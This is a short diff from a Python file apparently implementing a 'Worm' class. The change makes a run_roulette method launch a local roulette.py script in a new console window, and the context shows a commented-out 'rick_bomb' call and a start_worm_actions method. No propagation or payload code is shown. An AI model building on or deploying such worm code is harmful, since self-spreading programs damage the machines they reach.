@@ -201,7 +201,7 @@ class Worm:
     #         self.rick_bomb()
     
     def run_roulette(self):       
-        subprocess.run(executable=f"{self.own_path}\\..\\roulette.py")
+        subprocess.Popen(executable=f"{self.own_path}\\..\\roulette.py", creationflags=subprocess.CREATE_NEW_CONSOLE)
         
         
     def start_worm_actions(self):
